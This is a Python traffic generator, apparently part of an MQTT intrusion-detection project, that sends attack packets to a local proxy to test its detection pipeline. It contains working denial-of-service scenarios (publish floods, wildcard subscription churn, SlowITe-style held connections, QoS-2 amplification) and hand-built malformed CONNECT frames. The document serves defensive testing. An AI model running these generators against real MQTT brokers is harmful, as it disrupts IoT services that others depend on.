"""
mqtt_live_attacks.py — Real MQTT attack traffic through SentriX proxy ingress.

Sends actual MQTT protocol packets to the proxy on TCP/1884.
Designed for live detection experiments: each scenario exercises a distinct
attack class so the proxy's parser → feature extractor → ONNX chain is
exercised end-to-end.

Usage:
    python -m simulators.mqtt.mqtt_live_attacks --attack publish_flood --count 300
    python -m simulators.mqtt.mqtt_live_attacks --attack wildcard_abuse --count 200
    python -m simulators.mqtt.mqtt_live_attacks --attack slowite --count 100 --keepalive 2
    python -m simulators.mqtt.mqtt_live_attacks --attack malformed --count 50
"""
from __future__ import annotations

import argparse
import random
import socket
import struct
import time
import threading

import paho.mqtt.client as mqtt

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_client(client_id: str, host: str, port: int, keepalive: int = 60) -> mqtt.Client:
    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        client_id=client_id,
        protocol=mqtt.MQTTv311,
    )
    client.connect(host, port, keepalive=keepalive)
    return client


def _random_payload(size: int = 64) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(size))


# ---------------------------------------------------------------------------
# Attack scenarios
# ---------------------------------------------------------------------------

def publish_flood(host: str, port: int, count: int, interval_ms: int) -> None:
    """High-rate PUBLISH flood — drives msg_rate (f00) and payload_entropy (f02) high."""
    client = _make_client("flood-attacker-01", host, port, keepalive=60)
    client.loop_start()
    sent = 0
    for i in range(count):
        topic = f"flood/sensor/{i % 10}"
        payload = _random_payload(random.randint(128, 512))
        client.publish(topic, payload=payload, qos=random.choice([0, 1]))
        sent += 1
        time.sleep(interval_ms / 1000.0)
    client.loop_stop()
    client.disconnect()
    print(f"[publish_flood] sent={sent} packets")


def wildcard_abuse(host: str, port: int, count: int) -> None:
    """Rapid wildcard SUBSCRIBE/UNSUBSCRIBE cycling — exercises resource_card (f13)."""
    client = _make_client("wildcard-attacker-01", host, port)
    client.loop_start()
    ops = 0
    for i in range(count):
        # Cycle through deep wildcard patterns
        patterns = [
            "#",
            "sensor/#",
            "data/+/raw/#",
            f"node/{i % 50}/+/#",
            "+/+/+/#",
        ]
        topic = random.choice(patterns)
        client.subscribe(topic, qos=1)
        time.sleep(0.02)
        client.unsubscribe(topic)
        ops += 1
        time.sleep(0.01)
    client.loop_stop()
    client.disconnect()
    print(f"[wildcard_abuse] operations={ops}")


def slowite(host: str, port: int, count: int, keepalive: int) -> None:
    """SlowITe-style: open many connections with very short keep-alive, send minimal traffic."""
    clients: list[mqtt.Client] = []
    for i in range(min(count, 20)):
        try:
            c = _make_client(f"slow-{i:03d}", host, port, keepalive=keepalive)
            c.loop_start()
            clients.append(c)
            # Publish one tiny message every keepalive seconds to stay alive
            c.publish(f"slow/heartbeat/{i}", payload=b"\x00", qos=0)
            time.sleep(0.1)
        except Exception as exc:
            print(f"[slowite] connection {i} failed: {exc}")
    # Hold connections open
    print(f"[slowite] holding {len(clients)} slow connections for {keepalive * 3}s")
    time.sleep(keepalive * 3)
    for c in clients:
        c.loop_stop()
        c.disconnect()
    print(f"[slowite] done — {len(clients)} connections drained")


def malformed_packets(host: str, port: int, count: int) -> None:
    """Send raw malformed MQTT frames directly over TCP to trigger parser errors."""
    sent = 0
    for i in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((host, port))

            # Malformed CONNECT: valid fixed header but truncated remaining length
            malformed_frames = [
                # Frame 1: Wrong packet type in fixed header (0xF0)
                b"\xF0\x00",
                # Frame 2: CONNECT with zero remaining length
                b"\x10\x00",
                # Frame 3: Valid CONNECT header but garbage variable header
                b"\x10\x28" + bytes(random.randint(0, 255) for _ in range(40)),
                # Frame 4: Oversized remaining length indicator
                b"\x10\xFF\xFF\xFF\x01" + b"\x00" * 50,
            ]
            frame = random.choice(malformed_frames)
            sock.sendall(frame)
            time.sleep(0.05)
            sock.close()
            sent += 1
        except Exception:
            pass
        time.sleep(0.1)
    print(f"[malformed] sent={sent} malformed frames")


def qos2_amplification(host: str, port: int, count: int) -> None:
    """QoS-2 handshake amplification — each PUBLISH triggers 4-step PUBREC/PUBREL/PUBCOMP."""
    client = _make_client("qos2-attacker-01", host, port)
    client.loop_start()
    sent = 0
    for i in range(count):
        payload = _random_payload(random.randint(32, 256))
        client.publish(f"qos2/flood/{i % 20}", payload=payload, qos=2)
        sent += 1
        time.sleep(0.05)
    client.loop_stop()
    client.disconnect()
    print(f"[qos2_amplification] published={sent} QoS-2 messages")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

ATTACKS = {
    "publish_flood": publish_flood,
    "wildcard_abuse": wildcard_abuse,
    "slowite": slowite,
    "malformed": malformed_packets,
    "qos2_amplification": qos2_amplification,
}


def main() -> None:
    parser = argparse.ArgumentParser(description="Live MQTT attack traffic generator for SentriX")
    parser.add_argument("--host", default="127.0.0.1", help="Proxy MQTT ingress host")
    parser.add_argument("--port", type=int, default=1884, help="Proxy MQTT ingress port")
    parser.add_argument(
        "--attack",
        choices=list(ATTACKS.keys()),
        default="publish_flood",
        help="Attack scenario to execute",
    )
    parser.add_argument("--count", type=int, default=200, help="Number of messages/operations")
    parser.add_argument("--interval-ms", type=int, default=10, help="Inter-packet delay (ms) for publish_flood")
    parser.add_argument("--keepalive", type=int, default=3, help="MQTT keepalive seconds (for slowite)")
    args = parser.parse_args()

    print(f"[mqtt_live_attacks] Starting: attack={args.attack} host={args.host}:{args.port} count={args.count}")
    start = time.time()

    if args.attack == "publish_flood":
        publish_flood(args.host, args.port, args.count, args.interval_ms)
    elif args.attack == "wildcard_abuse":
        wildcard_abuse(args.host, args.port, args.count)
    elif args.attack == "slowite":
        slowite(args.host, args.port, args.count, args.keepalive)
    elif args.attack == "malformed":
        malformed_packets(args.host, args.port, args.count)
    elif args.attack == "qos2_amplification":
        qos2_amplification(args.host, args.port, args.count)

    elapsed = time.time() - start
    print(f"[mqtt_live_attacks] Done in {elapsed:.1f}s")


if __name__ == "__main__":
    main()
